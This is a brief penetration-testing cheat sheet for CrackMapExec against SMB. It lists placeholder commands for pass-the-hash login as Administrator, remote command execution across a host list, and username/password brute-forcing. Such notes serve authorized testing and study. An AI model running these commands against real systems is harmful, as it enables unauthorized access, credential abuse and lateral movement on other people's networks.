# crackmapexec

## SMB

```csharp
crackmapexec smb <TARGET_IP> -d <DOMAIN> -u Administrator -H <NTLM HASH>
```

### Executing a command on a provided hosts list

```csharp
crackmapexec smb <HOST.lst> -d domain.com -u Administrator -H <NTLM HASH> -x 'whoami'
```

### Bruteforce attack

```csharp
crackmapexec smb <TARGET_IP> -u <user.lst> -p <pass.list>
```

